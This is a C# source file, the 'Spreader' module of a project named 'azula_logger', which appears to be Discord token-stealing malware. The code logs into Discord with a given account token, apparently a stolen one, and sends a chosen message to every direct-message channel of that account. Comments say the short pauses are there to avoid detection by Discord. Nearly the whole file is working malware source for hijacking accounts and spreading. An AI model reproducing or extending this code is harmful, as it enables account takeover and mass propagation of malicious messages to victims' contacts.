using Discord;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace azula_logger
{
    public static class Spreader
    {
        //using this for the message cus the other stuff was kinda gae
        public static string message()
        {
            //you can replace your-Message with a custom message
            string msg = "your-Message";

            return msg;
        }







        public static void spread(string token )
        {
            //making the client
            DiscordSocketClient client = new DiscordSocketClient();
            try
            {
                //logging in with the token
                client.Login(token);
                //making a Listener to when the client is logged in
                client.OnLoggedIn += Client_OnLoggedIn;

                //waiting till the listener is toggled
                Thread.Sleep(-1);

            }
            catch { }            

            
        }
        //when its logged in its gonna call this code
        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            try
            {
                //grabbing all dms the client has
                foreach (var dm in client.GetPrivateChannels())
                {
                    //waiting a bit to not seem too sus to discord
                    Thread.Sleep(69);
                    //sending the message
                    dm.SendMessage(message());
                }
            }
            catch { }
            
        }

       
    }
}
